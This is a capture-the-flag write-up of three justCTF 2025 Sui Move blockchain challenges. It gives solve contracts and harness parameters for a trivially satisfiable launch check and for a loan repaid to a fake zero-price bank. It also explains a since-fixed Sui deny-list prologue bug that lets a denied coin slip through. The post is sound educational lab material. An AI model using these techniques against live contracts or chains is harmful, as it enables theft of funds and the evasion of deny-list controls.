---
title: "justCTF 2025"
description: "Writeups for JustCTF Blockchain challenge"
date: 'Aug 4 2025'
tags: ['writeup','web3','justctf']
authors: ['ctfguy']
---

## Otternaut Launch — Blockchain (174 pts)

> *Stranded on the frozen wastelands of Cryon-7, the Otternaut awakens in a half-buried, decades-old emergency capsule. Life support is failing, communications are dead, and the orbiting relay has gone silent. The only hope lies in restoring the capsule's core systems. But the capsule was never meant to launch solo — it was built to be assembled piece by piece in a controlled lab, not reconstructed by paw in the wreckage of a crash site. Armed with salvaged tools, jury-rigged firmware, and sheer determination, the Otternaut begins to assemble the launch capsule manually, installing exo-frame parts, calibrating avionics, and overriding water-efficiency protocols. If every component fits — and every test passes — the capsule might just ignite. But the odds are thin. And Cryon-7 is getting colder.*


This Sui‑based CTF level ships a custom Move module that models a do‑it‑yourself rocket assembly line. Our task is to deploy a helper contract (`solution::solve`) that, when executed by the framework, prepares the capsule so that `otternaut_launch::check_capsule_ready` passes. Once it does, the server prints the flag.


### Analysis

1. The **server** publishes the **challenge package** at runtime, then exposes several *shared* objects:

   | FakeID | Type                                 |
   | ------ | ------------------------------------ |
   | (1,0)  | `LaunchCapsule` (✱ target)           |
   | (1,1)  | `LaunchInspectionLab` (required ≥ 9) |
   | (1,2)  | `OtternautLab`                       |

2. It calls `prepare_tools`, which *mints* three tools and transfers them to the player account `fixer_flippers`:

   | FakeID | Type                 |
   | ------ | -------------------- |
   | (3,0)  | `AvionicsCalibrator` |
   | (3,1)  | `HullFrame`          |
   | (3,2)  | `MicroWrench`        |

3. Finally it loads our compiled `solution.mv`, then invokes

```move
solution::solve( …dynamic‑args… )
```

The arguments are picked by us via the `PARAMS_LIST` array in `framework-solve/src/main.rs` and are passed **by position**, not by type checking!  This lets us feed any objects we like.



### Vulnerability / "bug"

The intended path is baked into the Move code itself.

```move
public fun check_capsule_ready(capsule: &LaunchCapsule) {
    assert!(&capsule.status == CapsuleStatus::READY_FOR_LAUNCH, CAPSULE_NOT_READY);
    assert!(capsule.flight_software_version == REQUIRED_OS_VERSION, INVALID_OS_VERSION);
}
```

Only two fields need to be correct:

| Field                     | Required value     | Where we can set it                               |
| ------------------------- | ------------------ | ------------------------------------------------- |
| `status`                  | `READY_FOR_LAUNCH` | set by `assemble_launch_capsule()`                |
| `flight_software_version` | `42`               | the `os` parameter to `assemble_launch_capsule()` |

Inside `assemble_launch_capsule` we **fully control** two helper structs:

```move
let boosters = build_boosters(lab, 9);      // thrust_rating = 9 ≥ required_safety
let os       = generate_flight_os(lab, 42); // version = 42
```

No additional checks are performed (`build_boosters` and `generate_flight_os` are pure constructors). Therefore we can always satisfy safety & version requirements as long as we own:

* `&mut LaunchCapsule` (shared object (1,0))
* `&OtternautLab`     (shared object (1,2))
* `&LaunchInspectionLab` (shared object (1,1))
* The three tool objects previously minted

Because the framework runs under the privileged address `fixer_flippers`, we have permission to mutate & consume those assets.

---

### Exploit / Solve steps

1. **Choose argument list** (in `PARAMS_LIST`):

```rust
const PARAMS_LIST: [(u8,u8); 6] = [
    (1,0), // &mut LaunchCapsule
    (1,2), // &OtternautLab
    (1,1), // &LaunchInspectionLab
    (3,2), // MicroWrench
    (3,0), // AvionicsCalibrator
    (3,1), // HullFrame
];
```

2. **Deploy `solution::solve`** that:

   * Builds `boosters` with thrust 9.
   * Builds `os` with version 42.
   * Calls `assemble_launch_capsule` consuming the three tools.

3. After `solve` returns, the capsule is READY and `check_capsule_ready` succeeds, so the server prints `Congrats, flag: …`.


### Solution contract

```rust
module solution::solution {
    use challenge::otternaut_launch::{
        LaunchCapsule, OtternautLab, LaunchInspectionLab,
        MicroWrench, AvionicsCalibrator, HullFrame,
        build_boosters, generate_flight_os, assemble_launch_capsule
    };

    public fun solve(
        capsule: &mut LaunchCapsule,
        lab: &OtternautLab,
        insp: &LaunchInspectionLab,
        wrench: MicroWrench,
        calibrator: AvionicsCalibrator,
        frame: HullFrame,
    ) {
        // Safety threshold is 9; give thrust >= 9 and OS version 42
        let boosters = build_boosters(lab, 9);
        let os = generate_flight_os(lab, 42);

        // Assemble and mark READY_FOR_LAUNCH
        assemble_launch_capsule(
            capsule,
            lab,
            insp,
            wrench,
            calibrator,
            frame,
            boosters,
            os
        );
    }
}

```

### TL;DR

* `check_capsule_ready` only checks two fields.
* We can freely craft those fields via `assemble_launch_capsule`.
* Tools are minted for us; booster & OS constructors have no guards.
* Feed the right objects in the right order → capsule becomes valid → flag.

---

## Otternaut Syndicate — Blockchain (271 pts)

> *Freshly launched from Cryon-7, the Otternaut crash-lands again – this time next to a shadowy “Cryon Underbank”.
> The bank’s Council Guard will let you walk away with a priceless **Forbidden Fuel Cell** – but only if you bribe them with **3 333 Cryon Credits**.
> A single loan could cover the bribe… yet the contract swears every borrower must repay in full.
> Escape demands an accountant’s sleight-of-hand – not rocket science.*

---

### Analysis

After boot-strapping the Move runtime the framework:

|  FakeID | Type                                                                             | Notes                               |
| ------: | -------------------------------------------------------------------------------- | ----------------------------------- |
| `(1,0)` | `challenge::otternaut_syndicate::BankCap`                                        | used during set-up, then irrelevant |
| `(1,1)` | `challenge::otternaut_syndicate::CouncilGuard` ✱                                 | **flag gate** – needs the bribe     |
| `(1,2)` | `challenge::otternaut_syndicate::CryonUnderbank<CRYON_CREDITS,S_CRYON_CREDITS>` | holds *all* 3 333 CRYON_CREDITS    |
| `(1,6)` | `sui::coin::TreasuryCap<CRYON_CREDITS>`                                        | also only used during set-up        |

The Rust harness later calls

```rust
solution::solve(arg0, arg1, …)
```

where each `arg` is picked by index from the list **we** provide in the client.


### Key functions 

```move
/************  flag gate  ************/
public fun bribe_guard(guard, coins) {
    assert!(coins.value() >= 3_333, NOT_ENOUGH_FUNDS);
    guard.bal.join(coins.into_balance());
    guard.is_corrupted = true;
}
public fun is_solved(guard) {
    assert!(guard.is_corrupted, NOT_SOLVED);
}

/************  lending logic  ************/
public fun lend<X,SX>(
    acct, bank, amount, ctx
): (Coin<X>, LendReceipt<X>) { … }          // leaks `amount` from bank

public fun repay<X,SX>(
    acct, bank, coin
) {                                         // only checks `coin.value()`
    let debt = acct.take_all<X,SX>();       // ***filtered by phantom SX***
    let amt  = bank.calculate_shares_to_coin(debt.value()); // uses share_price
    assert!(coin.value() == amt, NOT_ENOUGH_FUNDS);
    …                                        // sets acct.dx = 0
}
```

Observations

* **`is_solved` only looks at `guard.is_corrupted`.**
  The bank, accounts, shares, receipts – none of that is re-checked.
* `lend` happily hands us real coins and only remembers the debt in
  *`acct.dx`* and the per-phantom-type **bag**.
* `repay` can be pointed at **any** `CryonUnderbank<X,SX>` object; the
  debt filter is on `SX`.
  If we repay to a bank whose `SX ≠ original_SX` *and* whose
  `share_price = 0`, it accepts a **0-value coin**.

That is the core bug.


### Exploit plan

1. **Create a fake bank**
   `new_underbank<CRYON_CREDITS, S_CRYON_CREDITS_HA>(share_price = 0)`.
2. `open_account` → `lend` 3 333 CC from the **real** bank.
   *We now hold the exact bribe.*
3. `bribe_guard` with those coins – flag condition met.
4. Call `repay` + `consume_receipt` **against the fake bank** with a
   zero-value coin.
   This clears `acct.dx` and disposes the non-droppable `LendReceipt`
   so the compiler is happy.
5. Move the remaining key objects into shared storage; function returns
   with a clean stack.

---

### Solution contract

```rust
module solution::solution {


    use sui::tx_context::TxContext;
    use sui::transfer;           // public_share_object / public_transfer
    use sui::balance;            // create_supply, zero()

    use challenge::cryon_credits::CRYON_CREDITS;
    use challenge::otternaut_syndicate::{
        S_CRYON_CREDITS,
        CryonUnderbank, CouncilGuard, BankCap,
        open_account, lend, repay, consume_receipt, bribe_guard,
        new_underbank,
    };

    public struct S_CRYON_CREDITS_HA has drop {}

    #[allow(lint(self_transfer))]
    public fun solve(
        bank : &mut CryonUnderbank<CRYON_CREDITS, S_CRYON_CREDITS>,  // (1, 2)
        guard: &mut CouncilGuard,                                    // (1, 1)
        ctx  : &mut TxContext,
    ) {
        /* spin-up a dummy bank with share_price = 0 */
        let supply = balance::create_supply(S_CRYON_CREDITS_HA {});
        let (mut fake_bank, fake_cap)
            = new_underbank<CRYON_CREDITS, S_CRYON_CREDITS_HA>(supply, /*price*/ 0, ctx);

        /* open an account & drain the REAL bank */
        let mut acct = open_account<CRYON_CREDITS>(ctx);
        let (loot, receipt) =
            lend<CRYON_CREDITS, S_CRYON_CREDITS>(&mut acct, bank, 3_333, ctx);

        /* bribe the guard — flag condition satisfied */
        bribe_guard(guard, loot);

        /* repay 0 CC to the FAKE bank → resets debt & lets us burn the receipt */
        let zero_coin = balance::zero<CRYON_CREDITS>().into_coin(ctx);
        repay<CRYON_CREDITS, S_CRYON_CREDITS_HA>(&mut acct, &mut fake_bank, zero_coin);
        consume_receipt<CRYON_CREDITS>(&mut acct, receipt);

        /* park leftover key objects on-chain so nothing non-droppable lingers */
        transfer::public_share_object(acct);
        transfer::public_share_object(fake_bank);
        transfer::public_transfer(fake_cap, ctx.sender());
    }
}

```

### Client-side argument list

Only two objects are needed:

```rust
const PARAMS_LIST: [(u8,u8); 2] = [
    (1,2),   // &mut CryonUnderbank (real bank)
    (1,1),   // &mut CouncilGuard
];
```

The Rust framework passes them as mutable references in that order.



### Flag timeline

1. `solve` mutates `guard`, returns.
2. Framework calls `is_solved(guard)` → succeeds.
3. Server prints

   ```
   [SERVER] Correct Solution!
   [SERVER] Congrats, flag: justCTF{...}
   ```

### TL;DR

* **Phantom generics are part of a type’s identity** – swapping them lets
  you side-step per-type accounting if developers forget to tie them
  back to concrete data.
* A post-condition should always be enforced by *whoever relies on it*:
  here `is_solved` blindly trusts `bribe_guard`.
* Resource-safety errors at compile time often hint at creative
  work-arounds rather than roadblocks – we used a fake bank solely to
  dispose of a non-droppable receipt.


---

## Otternaut Exodus - Blockchain (435 pts)

> *With the council distracted and the vault briefly exposed, the Otternaut finally grasps a single Forbidden Fuel Cell — only for a failsafe to trip the moment it’s minted. Their address is auto‑denied; any touch of that fuel type should now fail at the gate. The capsule is ready, the stars are waiting — but first, the Otternaut must outwit the very system designed to stop them.*

This Sui‑based CTF level ships runtime‑published Move modules and a small Rust harness. Our job is to deploy a helper package (`solution`) and implement `solution::solution::solve` so that the shared capsule becomes fueled, making `challenge::otternaut_exodus::verify_tank` succeed. When it does, the server prints the flag.


### Analysis

#### Challenge layout & versions

Relevant files & lines:

* `sources/framework/chall/Move.lock` → `compiler-version = "1.31.0"`, `edition = "2024.beta"`, `flavor = "sui"` (old compiler).
* `sources/framework/Cargo.toml` → Sui crates pinned to `tag = "mainnet-v1.30.1"` (the runtime/VM version that still had the denylist bug).
* `sources/framework/src/main.rs` → the harness that:

  1. publishes the challenge modules `otternaut_exodus` and `fuel_cell`,
  2. prompts for our compiled solution module bytes,
  3. asks us for a **byte list of FakeIDs** that become arguments to `solution::solve`,
  4. invokes `solution::solve`, then checks `verify_tank`.

Key snippet from the harness (argument parsing):

```rust
let mut serialized_arguments = [0_u8; 2000];
let mut arguments = Vec::new();
let bytes_read = stream.read(&mut serialized_arguments)?;
if bytes_read >= 2 {
    for chunk in serialized_arguments[..bytes_read].chunks(2) {
        let param = (chunk[0], chunk[1]);
        arguments.push(param);
    }
}
...
// later, each (x,y) becomes a FakeID for an Object argument
let obj = SuiValue::Object(FakeID::Enumerated(x.into(), y.into()), None);
```

So **we** decide which objects are passed to our entry function — by position — via pairs of bytes `(x, y)`.

#### Challenge Move code (abridged)

`challenge::fuel_cell` creates a regulated coin `FUEL_CELL` with `TreasuryCap` and `DenyCapV2` transferred to the admin address.

`challenge::otternaut_exodus` exposes:

```move
public struct CouncilCap has key { /* ... */ }
public struct OtternautCapsule has key { id: UID, fuel_vault: Balance<FUEL_CELL> }
const TANK_EMPTY: u64 = 1337;

public fun steal_forbidden_fuel_cell(
    _               : &CouncilCap,
    receiver        : address,
    treasury_cap    : &mut TreasuryCap<FUEL_CELL>,
    deny_cap        : &mut DenyCapV2<FUEL_CELL>,
    deny_list       : &mut DenyList,
    ctx             : &mut TxContext,
) {
    treasury_cap.mint_fuel_cell(receiver, 1, ctx);
    coin::deny_list_v2_add(deny_list, deny_cap, receiver, ctx);
}

public fun fuel_capsule(fuel: Coin<FUEL_CELL>, cap: &mut OtternautCapsule) {
    let bal = fuel.into_balance();
    cap.fuel_vault.join(bal);
}

public fun verify_tank(capsule: &OtternautCapsule) {
    assert!(capsule.fuel_vault.value() > 0, TANK_EMPTY);
}
```

The server calls `steal_forbidden_fuel_cell` **before** our code runs: we receive one `Coin<FUEL_CELL>` and our address is added to the deny‑list for this type.

### Why focus on the deny‑list

Because after that setup, *any* transaction that includes `Coin<FUEL_CELL>` **should** be rejected by the prologue if the sender address is denied. So to ever call `fuel_capsule(fuel_cell, capsule)` we need a way around the deny‑list gate — either removal, or a bypass.

### The vulnerability (old Sui)

> **Upstream fix:**
 https://github.com/MystenLabs/sui/commit/f644d71e70ee2692a4de34472c9cd7e126116448

The old coin deny‑list prologue did roughly this:

```rust
for coin_type in coin_types_in_tx {
    match get_per_type_denylist_config(coin_type) {
        None => return Ok(()),      // early return – stops checking others
        Some(cfg) => {
            if cfg.is_denied(sender) { fail }
        }
    }
}
```

If the transaction contained **any** coin type with **no** denylist entry, the loop **returned success immediately**, skipping the denied type that might appear later in the same transaction.

That is exactly the primitive we need: make the transaction also carry a second, **benign** coin type — one that certainly has no per‑type config — and ensure it is present so the prologue exits early. The forbidden fuel cell is then ignored.

---

### Exploit / Solve

#### Our helper package

We publish a package `solution::solution` with:

1. an `init` creating a new regulated currency `SOLUTION` and minting 1 coin to ourselves; and
2. a `solve` that moves the forbidden `Coin<FUEL_CELL>` into the capsule while also including our benign `Coin<SOLUTION>` in the same transaction (to trigger the early exit).


```move

```

> Notes
>
> * The one‑time witness name (`SOLUTION`) matches the module name upper‑case.
> * `init` is not `public`.
> * We keep the module/file layout so the harness finds `solution.mv` (or `solution.mv` based on your workspace).

#### Choosing the parameter list

After the server runs its setup (steal & deny), it prints an object dump. In our run it contained:

| FakeID | Type / Meaning                                                                         |
| -----: | -------------------------------------------------------------------------------------- |
|  (1,2) | `challenge::otternaut_exodus::OtternautCapsule` (shared)                               |
|  (3,0) | `sui::coin::Coin<challenge::fuel_cell::FUEL_CELL>` (the forbidden coin we were minted) |
|  (2,1) | `sui::coin::Coin<solution::solution::SOLUTION>` (minted in our `init`)                 |

Our `solve` signature is `(capsule, fuel_cell_coin, solution_coin)`, so we send these three **by position**:

```rust
const PARAMS_LIST: [(u8,u8); 3] = [
    (1, 2),  // &mut OtternautCapsule
    (3, 0),  // Coin<FUEL_CELL>
    (2, 1),  // Coin<SOLUTION>
];
```

Serialized bytes: `01 02 03 00 02 01`.

**Why this worked:** the transaction included both coin types; the prologue encountered a type without a denylist entry (`SOLUTION`) and exited early, never evaluating the deny status for `FUEL_CELL`. `fuel_capsule` then moved the forbidden fuel into the capsule, making `verify_tank` pass.

### Running locally

```bash
# Build server image
docker build -t exodus -f Dockerfile .

# Terminal A: run the vulnerable server
docker run --rm -it --network host -e FLAG=dummyflag \
  exodus bash -c "cd /workspace/sources && ./run_server.sh"

# Build client image (solver)
docker build -t exodus-solve -f solve.Dockerfile .

# Terminal B: run the client against localhost
docker run --rm -it --network host \
  -e HOST=127.0.0.1 -e PORT=31337 \
  exodus-solve bash -c "cd /workspace/sources && ./run_client.sh"
```

Expected tail:

```
[SERVER] Correct Solution!
[SERVER] Congrats, flag: dummyflag
```

Switch `HOST` to the remote instance when ready.

---

### TL;DR

* The challenge pins **Sui framework mainnet‑v1.30.1** and **Move compiler 1.31.0 (sui flavor)**.
* Those versions contain a **deny‑list prologue bug**: if a transaction includes coins of multiple types and the first encountered type has **no per‑type denylist config**, the check **returns early** and **skips** checking subsequent coin types (including denied ones).
* We publish a benign coin type `SOLUTION` in our `init` (mint 1 coin to ourselves). In `solve`, we include **both** `Coin<SOLUTION>` and the forbidden `Coin<FUEL_CELL>` in the same transaction and call `fuel_capsule` with the forbidden coin. The prologue sees `SOLUTION` first and bails early; the forbidden coin slips through. Capsule is non‑zero → `verify_tank` passes → flag.

---

### Takeaways

* Always check **tooling & framework versions**. The `Move.lock` and Cargo pins quickly revealed an old Sui build; looking up recent fixes around the **deny-list** led straight to the vulnerability class.
* When a framework lets you choose **which objects** become the arguments to your entry point, you can often **shape the transaction** to trigger subtle consensus/prologue bugs.
* Defense: the upstream fix replaced the early `return` with a `continue`, ensuring *all* coin types in a transaction are checked before admitting it.
